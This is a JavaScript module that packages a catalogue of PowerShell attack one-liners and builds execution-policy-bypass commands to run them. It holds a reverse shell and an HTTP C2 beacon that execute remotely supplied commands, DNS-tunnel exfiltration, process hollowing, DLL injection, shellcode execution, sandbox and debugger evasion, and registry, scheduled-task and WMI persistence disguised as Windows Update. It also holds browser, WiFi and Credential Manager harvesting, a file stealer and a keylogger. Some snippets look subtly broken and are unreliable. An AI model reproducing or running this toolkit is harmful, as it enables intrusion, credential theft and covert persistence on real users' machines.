// RawrZ PowerShell One-Liners Engine
// Public Domain 2025

class PowerShellOneLinersEngine {
    constructor() {
        this.name = 'PowerShell One-Liners Engine';
        this.version = '1.0.0';
        this.description = 'Collection of PowerShell one-liners for various security operations';
        this.oneLiners = this.initializeOneLiners();
    }

    initializeOneLiners() {
        return {
            // Encryption & Crypto
            'aes-encrypt': {
                name: 'AES-256-GCM Encryption',
                description: 'One-liner AES-256-GCM encryption with random key/IV',
                category: 'encryption',
                code: `$f=$args[0];$k=New-Object byte[] 32;(New-Object System.Security.Cryptography.RNGCryptoServiceProvider).GetBytes($k);$iv=New-Object byte[] 12;(New-Object System.Security.Cryptography.RNGCryptoServiceProvider).GetBytes($iv);$a=[System.Security.Cryptography.Aes]::Create();$a.Key=$k;$a.IV=$iv;$a.Mode='GCM';$e=$a.CreateEncryptor();$d=[System.IO.File]::ReadAllBytes($f);$c=$e.TransformFinalBlock($d,0,$d.Length);$t=$a.Tag;[System.IO.File]::WriteAllBytes("$f.enc",$c+$t);Write-Host "Key: $([Convert]::ToBase64String($k)) IV: $([Convert]::ToBase64String($iv))"`
            },
            
            'camellia-encrypt': {
                name: 'Camellia-256-CTR Encryption',
                description: 'One-liner Camellia-256-CTR encryption',
                category: 'encryption',
                code: `$f=$args[0];$k=New-Object byte[] 32;(New-Object System.Security.Cryptography.RNGCryptoServiceProvider).GetBytes($k);$iv=New-Object byte[] 16;(New-Object System.Security.Cryptography.RNGCryptoServiceProvider).GetBytes($iv);$a=[System.Security.Cryptography.Camellia]::Create();$a.Key=$k;$a.IV=$iv;$a.Mode='CTR';$e=$a.CreateEncryptor();$d=[System.IO.File]::ReadAllBytes($f);$c=$e.TransformFinalBlock($d,0,$d.Length);[System.IO.File]::WriteAllBytes("$f.cam",$c);Write-Host "Key: $([Convert]::ToBase64String($k)) IV: $([Convert]::ToBase64String($iv))"`
            },

            'chacha20-encrypt': {
                name: 'ChaCha20-Poly1305 Encryption',
                description: 'One-liner ChaCha20-Poly1305 encryption',
                category: 'encryption',
                code: `$f=$args[0];$k=New-Object byte[] 32;(New-Object System.Security.Cryptography.RNGCryptoServiceProvider).GetBytes($k);$iv=New-Object byte[] 12;(New-Object System.Security.Cryptography.RNGCryptoServiceProvider).GetBytes($iv);$a=[System.Security.Cryptography.ChaCha20Poly1305]::new($k);$d=[System.IO.File]::ReadAllBytes($f);$c=New-Object byte[] $d.Length;$t=New-Object byte[] 16;$a.Encrypt($iv,$d,$c,$t);[System.IO.File]::WriteAllBytes("$f.cha",$c+$t);Write-Host "Key: $([Convert]::ToBase64String($k)) IV: $([Convert]::ToBase64String($iv))"`
            },

            // Anti-Analysis
            'anti-debug': {
                name: 'Anti-Debug Detection',
                description: 'One-liner anti-debug detection and evasion',
                category: 'anti-analysis',
                code: `if([System.Diagnostics.Debugger]::IsAttached -or [System.Diagnostics.Process]::GetCurrentProcess().ProcessName -eq 'devenv' -or [System.Diagnostics.Process]::GetCurrentProcess().ProcessName -eq 'windbg'){Write-Host 'Debugger detected!';exit};$p=[System.Diagnostics.Process]::GetCurrentProcess();$h=$p.Handle;if([System.Runtime.InteropServices.Marshal]::ReadInt32($h,0x68) -band 0x1000){Write-Host 'Being debugged!';exit};Write-Host 'No debugger detected'`
            },

            'anti-vm': {
                name: 'Anti-VM Detection',
                description: 'One-liner virtual machine detection',
                category: 'anti-analysis',
                code: `$vm=@('VMware','VirtualBox','VBOX','QEMU','Xen','Hyper-V');$wmi=Get-WmiObject -Class Win32_ComputerSystem;if($vm -contains $wmi.Manufacturer -or $vm -contains $wmi.Model){Write-Host 'VM detected: '+$wmi.Manufacturer+' '+$wmi.Model;exit};$bios=Get-WmiObject -Class Win32_BIOS;if($vm -contains $bios.Manufacturer){Write-Host 'VM BIOS detected: '+$bios.Manufacturer;exit};Write-Host 'No VM detected'`
            },

            'anti-sandbox': {
                name: 'Anti-Sandbox Detection',
                description: 'One-liner sandbox environment detection',
                category: 'anti-analysis',
                code: `$sb=@('sandbox','malware','virus','analysis','cuckoo','joe','anubis');$proc=Get-Process|Select-Object -ExpandProperty ProcessName;$user=$env:USERNAME.ToLower();$comp=$env:COMPUTERNAME.ToLower();if(($proc|Where-Object{$sb -contains $_.ToLower()}) -or ($sb -contains $user) -or ($sb -contains $comp)){Write-Host 'Sandbox detected!';exit};$uptime=(Get-Date)-(Get-CimInstance Win32_OperatingSystem).LastBootUpTime;if($uptime.TotalMinutes -lt 10){Write-Host 'Short uptime - possible sandbox';exit};Write-Host 'No sandbox detected'`
            },

            // Process & Memory
            'process-hollowing': {
                name: 'Process Hollowing',
                description: 'One-liner process hollowing technique',
                category: 'process',
                code: `$target='notepad.exe';$payload=[System.IO.File]::ReadAllBytes($args[0]);$p=Start-Process -FilePath $target -PassThru -WindowStyle Hidden;$h=$p.Handle;Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class P{[DllImport("kernel32")]static extern bool VirtualProtect(IntPtr a,uint s,uint f,out uint o);[DllImport("kernel32")]static extern bool WriteProcessMemory(IntPtr h,IntPtr a,byte[] b,uint s,out uint w);public static void H(IntPtr h,byte[] p){uint o;VirtualProtect(h,(uint)p.Length,0x40,out o);uint w;WriteProcessMemory(h,h,p,(uint)p.Length,out w);}}';[P]::H($h,$payload);Write-Host 'Process hollowing completed'`
            },

            'dll-injection': {
                name: 'DLL Injection',
                description: 'One-liner DLL injection technique',
                category: 'process',
                code: `$target=$args[1];$dll=[System.IO.File]::ReadAllBytes($args[0]);$p=Get-Process -Name $target -ErrorAction SilentlyContinue;if($p){$h=$p.Handle;Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class D{[DllImport("kernel32")]static extern IntPtr VirtualAllocEx(IntPtr h,IntPtr a,uint s,uint t,uint f);[DllImport("kernel32")]static extern bool WriteProcessMemory(IntPtr h,IntPtr a,byte[] b,uint s,out uint w);[DllImport("kernel32")]static extern IntPtr CreateRemoteThread(IntPtr h,IntPtr a,uint s,IntPtr e,IntPtr p,uint f,out uint i);public static void I(IntPtr h,byte[] d){IntPtr a=VirtualAllocEx(h,IntPtr.Zero,(uint)d.Length,0x1000|0x2000,0x40);WriteProcessMemory(h,a,d,(uint)d.Length,out uint w);CreateRemoteThread(h,IntPtr.Zero,0,a,IntPtr.Zero,0,out uint i);}}';[D]::I($h,$dll);Write-Host 'DLL injection completed'}else{Write-Host 'Target process not found'}`
            },

            'memory-alloc': {
                name: 'Memory Allocation',
                description: 'One-liner memory allocation and execution',
                category: 'memory',
                code: `$payload=[System.IO.File]::ReadAllBytes($args[0]);Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class M{[DllImport("kernel32")]static extern IntPtr VirtualAlloc(IntPtr p,uint s,uint t,uint f);[DllImport("kernel32")]static extern bool VirtualProtect(IntPtr a,uint s,uint f,out uint o);[DllImport("kernel32")]static extern IntPtr CreateThread(IntPtr a,uint s,IntPtr e,IntPtr p,uint f,out uint i);public static void E(byte[] p){IntPtr a=VirtualAlloc(IntPtr.Zero,(uint)p.Length,0x1000|0x2000,0x40);Marshal.Copy(p,0,a,p.Length);uint o;VirtualProtect(a,(uint)p.Length,0x20,out o);CreateThread(IntPtr.Zero,0,a,IntPtr.Zero,0,out uint i);}}';[M]::E($payload);Write-Host 'Memory allocation and execution completed'`
            },

            // Network & Communication
            'reverse-shell': {
                name: 'Reverse Shell',
                description: 'One-liner reverse shell connection',
                category: 'network',
                code: `$ip=$args[0];$port=$args[1];$client=New-Object System.Net.Sockets.TcpClient;$client.Connect($ip,$port);$stream=$client.GetStream();$reader=New-Object System.IO.StreamReader($stream);$writer=New-Object System.IO.StreamWriter($stream);$writer.AutoFlush=$true;while($client.Connected){$cmd=$reader.ReadLine();if($cmd -eq 'exit'){break};try{$result=Invoke-Expression $cmd 2>&1|Out-String;$writer.WriteLine($result)}catch{$writer.WriteLine($_.Exception.Message)}};$client.Close();Write-Host 'Reverse shell session ended'`
            },

            'http-beacon': {
                name: 'HTTP Beacon',
                description: 'One-liner HTTP beacon for C2 communication',
                category: 'network',
                code: `$url=$args[0];$interval=5;while($true){try{$response=Invoke-WebRequest -Uri $url -UseBasicParsing;$cmd=$response.Content;if($cmd -ne ''){$result=Invoke-Expression $cmd 2>&1|Out-String;$post=Invoke-WebRequest -Uri $url -Method POST -Body $result -UseBasicParsing}}catch{Start-Sleep $interval;continue};Start-Sleep $interval}`
            },

            'dns-tunnel': {
                name: 'DNS Tunnel',
                description: 'One-liner DNS tunneling for data exfiltration',
                category: 'network',
                code: `$domain=$args[0];$data=$args[1];$encoded=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($data));$chunks=$encoded -split '(?<=\G.{60})';foreach($chunk in $chunks){$dns=$chunk+'.'+$domain;try{Resolve-DnsName $dns -ErrorAction SilentlyContinue}catch{}};Write-Host 'DNS tunnel data sent'`
            },

            // Persistence & Lateral Movement
            'registry-persistence': {
                name: 'Registry Persistence',
                description: 'One-liner registry-based persistence',
                category: 'persistence',
                code: `$key='HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run';$name='WindowsUpdate';$payload=$args[0];$value="powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File \\"$payload\\"";Set-ItemProperty -Path $key -Name $name -Value $value;Write-Host 'Registry persistence installed'`
            },

            'scheduled-task': {
                name: 'Scheduled Task Persistence',
                description: 'One-liner scheduled task for persistence',
                category: 'persistence',
                code: `$taskName='WindowsUpdateService';$payload=$args[0];$action=New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File \\"$payload\\"";$trigger=New-ScheduledTaskTrigger -AtStartup;$settings=New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries;$principal=New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest;Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Principal $principal;Write-Host 'Scheduled task persistence installed'`
            },

            'wmi-persistence': {
                name: 'WMI Event Persistence',
                description: 'One-liner WMI event-based persistence',
                category: 'persistence',
                code: `$payload=$args[0];$filterName='WindowsUpdateFilter';$consumerName='WindowsUpdateConsumer';$filter=Set-WmiInstance -Class __EventFilter -Namespace root\\subscription -Arguments @{Name=$filterName;EventNameSpace='root\\cimv2';QueryLanguage='WQL';Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfRawData_PerfOS_System'"};$consumer=Set-WmiInstance -Class CommandLineEventConsumer -Namespace root\\subscription -Arguments @{Name=$consumerName;CommandLineTemplate="powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File \\"$payload\\""};$binding=Set-WmiInstance -Class __FilterToConsumerBinding -Namespace root\\subscription -Arguments @{Filter=$filter;Consumer=$consumer};Write-Host 'WMI persistence installed'`
            },

            // Credential Harvesting
            'browser-passwords': {
                name: 'Browser Password Harvesting',
                description: 'One-liner browser password extraction',
                category: 'credential',
                code: `$browsers=@('Chrome','Firefox','Edge');foreach($browser in $browsers){$path=switch($browser){'Chrome'{"$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data"}'Firefox'{"$env:APPDATA\\Mozilla\\Firefox\\Profiles\\*\\logins.json"}'Edge'{"$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default\\Login Data"}};if(Test-Path $path){$data=Get-Content $path -Raw;Write-Host "$browser passwords found: $($data.Length) bytes"}};Write-Host 'Browser password harvesting completed'`
            },

            'wifi-passwords': {
                name: 'WiFi Password Harvesting',
                description: 'One-liner WiFi password extraction',
                category: 'credential',
                code: `$profiles=netsh wlan show profiles|Select-String 'All User Profile'|ForEach-Object{$_.ToString().Split(':')[1].Trim()};foreach($profile in $profiles){$password=netsh wlan show profile name=$profile key=clear|Select-String 'Key Content'|ForEach-Object{$_.ToString().Split(':')[1].Trim()};if($password -ne ''){Write-Host "SSID: $profile, Password: $password"}};Write-Host 'WiFi password harvesting completed'`
            },

            'credential-manager': {
                name: 'Credential Manager Harvesting',
                description: 'One-liner Windows Credential Manager extraction',
                category: 'credential',
                code: `$creds=cmdkey /list 2>&1|Where-Object{$_ -match 'Target:'};foreach($cred in $creds){$target=$cred -replace 'Target: ','';$details=cmdkey /list:$target 2>&1;Write-Host "Credential: $target";Write-Host $details};Write-Host 'Credential Manager harvesting completed'`
            },

            // File Operations
            'file-stealer': {
                name: 'File Stealer',
                description: 'One-liner file collection and exfiltration',
                category: 'file',
                code: `$extensions=@('*.doc','*.docx','*.pdf','*.txt','*.xls','*.xlsx');$dest=$args[0];$files=@();foreach($ext in $extensions){$files+=Get-ChildItem -Path $env:USERPROFILE -Recurse -Include $ext -ErrorAction SilentlyContinue|Select-Object -First 10};foreach($file in $files){$destFile=Join-Path $dest $file.Name;Copy-Item $file.FullName $destFile -ErrorAction SilentlyContinue};Write-Host "Collected $($files.Count) files to $dest"`
            },

            'keylogger': {
                name: 'Keylogger',
                description: 'One-liner keylogging functionality',
                category: 'monitoring',
                code: `Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;using System.Windows.Forms;public class K{[DllImport("user32.dll")]static extern IntPtr GetForegroundWindow();[DllImport("user32.dll")]static extern uint GetWindowThreadProcessId(IntPtr h,out uint p);[DllImport("user32.dll")]static extern IntPtr GetKeyboardLayout(uint id);public static void L(){var hook=SetWindowsHookEx(13,new LowLevelKeyboardProc(Proc),GetModuleHandle(Process.GetCurrentProcess().MainModule.ModuleName),0);Application.Run();UnhookWindowsHookEx(hook);}[DllImport("user32.dll")]static extern IntPtr SetWindowsHookEx(int id,LowLevelKeyboardProc proc,IntPtr h,uint t);[DllImport("user32.dll")]static extern bool UnhookWindowsHookEx(IntPtr h);[DllImport("user32.dll")]static extern IntPtr CallNextHookEx(IntPtr h,int n,IntPtr w,IntPtr l);[DllImport("kernel32.dll")]static extern IntPtr GetModuleHandle(string n);delegate IntPtr LowLevelKeyboardProc(int n,IntPtr w,IntPtr l);static IntPtr Proc(int n,IntPtr w,IntPtr l){if(n>=0){int vkCode=Marshal.ReadInt32(l);Console.WriteLine("Key: "+vkCode);}return CallNextHookEx(IntPtr.Zero,n,w,l);}}';[K]::L()`
            },

            // System Information
            'system-info': {
                name: 'System Information Gathering',
                description: 'One-liner comprehensive system information collection',
                category: 'reconnaissance',
                code: `$info=@{};$info.ComputerName=$env:COMPUTERNAME;$info.Username=$env:USERNAME;$info.Domain=$env:USERDOMAIN;$info.OS=(Get-WmiObject Win32_OperatingSystem).Caption;$info.Architecture=(Get-WmiObject Win32_OperatingSystem).OSArchitecture;$info.Processors=(Get-WmiObject Win32_Processor).Name;$info.Memory=[math]::Round((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory/1GB,2);$info.NetworkAdapters=Get-WmiObject Win32_NetworkAdapter|Where-Object{$_.NetConnectionStatus -eq 2}|Select-Object Name,MacAddress;$info.Processes=Get-Process|Select-Object Name,Id,CPU,WorkingSet|Sort-Object CPU -Descending|Select-Object -First 10;$info.Services=Get-Service|Where-Object{$_.Status -eq 'Running'}|Select-Object Name,DisplayName;$info.InstalledSoftware=Get-WmiObject Win32_Product|Select-Object Name,Version,Vendor;$info|ConvertTo-Json -Depth 3|Out-File 'system_info.json';Write-Host 'System information saved to system_info.json'`
            },

            'network-scan': {
                name: 'Network Scanner',
                description: 'One-liner network port scanner',
                category: 'network',
                code: `$target=$args[0];$ports=@(21,22,23,25,53,80,110,135,139,143,443,993,995,1433,3389,5432,5900,8080);$results=@();foreach($port in $ports){try{$tcp=New-Object System.Net.Sockets.TcpClient;$tcp.Connect($target,$port);$results+="Port $port - Open";$tcp.Close()}catch{$results+="Port $port - Closed"}};$results|Out-File "scan_$target.txt";Write-Host "Network scan completed for $target"`
            }
        };
    }

    getOneLiner(category = null) {
        if (category) {
            return Object.entries(this.oneLiners)
                .filter(([key, value]) => value.category === category)
                .reduce((acc, [key, value]) => {
                    acc[key] = value;
                    return acc;
                }, {});
        }
        return this.oneLiners;
    }

    executeOneLiner(name, args = []) {
        const oneLiner = this.oneLiners[name];
        if (!oneLiner) {
            throw new Error(`One-liner '${name}' not found`);
        }

        return {
            name: oneLiner.name,
            description: oneLiner.description,
            category: oneLiner.category,
            code: oneLiner.code,
            args: args,
            command: `powershell -ExecutionPolicy Bypass -Command "${oneLiner.code}" ${args.join(' ')}`
        };
    }

    getCategories() {
        const categories = [...new Set(Object.values(this.oneLiners).map(ol => ol.category))];
        return categories;
    }

    getStats() {
        const categories = this.getCategories();
        const stats = {};
        
        categories.forEach(category => {
            stats[category] = Object.values(this.oneLiners)
                .filter(ol => ol.category === category).length;
        });

        return {
            total: Object.keys(this.oneLiners).length,
            categories: stats,
            categoriesList: categories
        };
    }

    getStatus() {
        return {
            name: this.name,
            version: this.version,
            description: this.description,
            status: 'active',
            oneLinersCount: Object.keys(this.oneLiners).length,
            categories: this.getCategories(),
            stats: this.getStats()
        };
    }
}

module.exports = PowerShellOneLinersEngine;
